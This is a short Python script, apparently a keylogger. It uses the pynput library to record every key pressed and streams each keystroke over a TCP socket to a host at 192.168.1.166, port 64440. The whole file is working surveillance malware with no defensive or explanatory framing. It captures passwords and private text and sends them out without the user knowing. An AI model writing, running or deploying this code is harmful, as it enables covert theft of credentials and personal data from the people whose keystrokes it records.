import socket
from pynput.keyboard import Listener

info = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
info.connect(("192.168.1.166", 64440))

def on_press(key):
    keypress = "{0}".format(key)
    print(keypress)
    info.sendall(bytes(keypress, "utf-8"))
    

with Listener(on_press=on_press) as listener:
    listener.join()
